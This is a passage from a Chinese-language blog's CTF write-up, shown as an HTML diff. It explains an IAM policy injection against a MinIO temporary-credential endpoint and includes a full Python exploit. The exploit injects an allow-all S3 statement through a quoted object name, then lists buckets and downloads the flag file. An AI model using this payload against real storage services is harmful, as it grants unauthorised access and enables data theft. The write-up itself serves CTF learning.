+<p>上面我们看到policy是一个json,这里可以尝试使用&quot;来闭合注入</p>
+<p>
+<div class="post-img-view">
+<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250601201024318.png">
+<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250601201024318.png" alt="image-20250601201024318"  />
+</a>
+</div>
+
+</p>
+<p>failed了，说明闭合上了，这里是可以注入的，后续也没啥东西了我觉得，就是注入一个高权限的policy，这里我直接甩exp</p>
+<pre tabindex="0"><code>from minio import Minio
+from minio.error import S3Error
+import requests
+import json
+BASE_URL = &#34;http://35.241.98.126:31802&#34;  # ← 改成你的目标地址
+UPLOAD_FILENAME = &#39;&#34;],\&#34;Action\&#34;:[\&#34;s3:GetObject\&#34;,\&#34;s3:PutObject\&#34;]},{&#34;Effect&#34;: &#34;Allow&#34;,&#34;Action&#34;: [&#34;s3:GetObject&#34;,&#34;s3:PutObject&#34;,&#34;s3:ListBucket&#34;,&#34;s3:ListAllMyBuckets&#34;,&#34;s3:GetBucketLocation&#34;],&#34;Resource&#34;: &#34;*&#34;}]}aaa&#39;
+UPLOAD_CONTENT = b&#34;This is a test file from attacker.&#34;
+ACCESS_KEY = &#34;&#34;
+SECRET_KEY = &#34;&#34;
+BUCKET_NAME = &#34;flag&#34;
+SESSION_TOKEN=&#34;&#34;
+
+
+# Step 1: 获取临时凭证
+def get_temp_creds(object_name):
+    global ACCESS_KEY, SECRET_KEY, SESSION_TOKEN
+    url = f&#34;{BASE_URL}/api/genSTSCreds&#34;
+    data = {&#34;object_name&#34;: object_name}
+    resp = requests.post(url, json=data)
+    resp.raise_for_status()
+    print(&#34;[+] 获取临时凭证成功&#34;)
+    # temp=json.loads()
+    ACCESS_KEY= resp.json()[&#39;access_key_id&#39;]
+    SECRET_KEY=resp.json()[&#39;secret_access_key&#39;]
+    SESSION_TOKEN=resp.json()[&#39;session_token&#39;]
+    return ACCESS_KEY,SECRET_KEY,SESSION_TOKEN
+# MinIO server configuration
+get_temp_creds(UPLOAD_FILENAME)
+# Initialize the MinIO client
+print(ACCESS_KEY)
+print(SECRET_KEY)
+print(SESSION_TOKEN)
+minio_client = Minio(
+    &#34;35.241.98.126:32402&#34;,
+    access_key=ACCESS_KEY,
+    secret_key=SECRET_KEY,
+    session_token=SESSION_TOKEN,
+    secure=False
+)
+
+
+def download_file(object_name, download_path):
+    &#34;&#34;&#34;Download a file from the MinIO bucket.&#34;&#34;&#34;
+    try:
+        minio_client.fget_object(BUCKET_NAME, object_name, download_path)
+        print(f&#34;[+] File &#39;{object_name}&#39; downloaded to &#39;{download_path}&#39;&#34;)
+    except S3Error as e:
+        print(f&#34;[-] Error downloading file: {e}&#34;)
+
+def list_objects():
+    &#34;&#34;&#34;List all objects in the MinIO bucket.&#34;&#34;&#34;
+    try:
+        objects = minio_client.list_objects(BUCKET_NAME)
+        print(&#34;[+] Objects in bucket:&#34;)
+        for obj in objects:
+            print(f&#34;  - {obj.object_name}&#34;)
+    except S3Error as e:
+        print(f&#34;[-] Error listing objects: {e}&#34;)
+
+def list_buckets():
+    &#34;&#34;&#34;List all buckets in the MinIO server.&#34;&#34;&#34;
+    try:
+        buckets = minio_client.list_buckets()
+        print(&#34;[+] Buckets:&#34;)
+        print(buckets)
+        for bucket in buckets:
+            print(f&#34;  - {bucket.name}&#34;)
+    except S3Error as e:
+        print(f&#34;[-] Error listing buckets: {e}&#34;)
+
+
+list_buckets()
+list_objects()
+download_file(&#34;flag&#34;, &#34;downloaded_example.txt&#34;)
+</code></pre><h2 id="tidy-quic">tidy quic</h2>
+
+        </div>
+    </div>
+    <a href="#" id="scrollToTopButton">
+        <svg t="1686753152588" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg"
+            p-id="3988" width="48" height="48">
+            <path
+                d="M518.5 360.3c-3.2-4.4-9.7-4.4-12.9 0l-178 246c-3.8 5.3 0 12.7 6.5 12.7H381c10.2 0 19.9-4.9 25.9-13.2L512 460.4l105.2 145.4c6 8.3 15.6 13.2 25.9 13.2H690c6.5 0 10.3-7.4 6.5-12.7l-178-246z"
+                p-id="3989" fill="#363636"></path>
+            <path
+                d="M512 64C264.6 64 64 264.6 64 512s200.6 448 448 448 448-200.6 448-448S759.4 64 512 64z m0 820c-205.4 0-372-166.6-372-372s166.6-372 372-372 372 166.6 372 372-166.6 372-372 372z"
+                p-id="3990" fill="#363636"></path>
+        </svg>
+    </a>
+
+<div class="pp-container">
+        <section class="pre-and-post">
+            <div class="has-text-left">
+                
+            </div>
+            <div class="has-text-right">
+                
+                <p>Next post</p>
+                <a href="http://localhost:1313/post/2025suctf/">2025-SUCTF-WP</a>
+                
+            </div>
+        </section>
+    </div>
+
+</div>
+
+        </main><footer class="footer">
+    <div class="content has-text-centered">
+    <span>&copy; 2025 <a href="http://localhost:1313/">GSBP&#39;s Blog</a></span>
+    
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+    <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+    
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" target="_blank">Hugo</a> &
+        <a href="https://github.com/hotjuicew/hugo-JuiceBar" target="_blank">JuiceBar</a>
+    </span>
+    </div>
+  </footer>
+</body>
+</html>
+
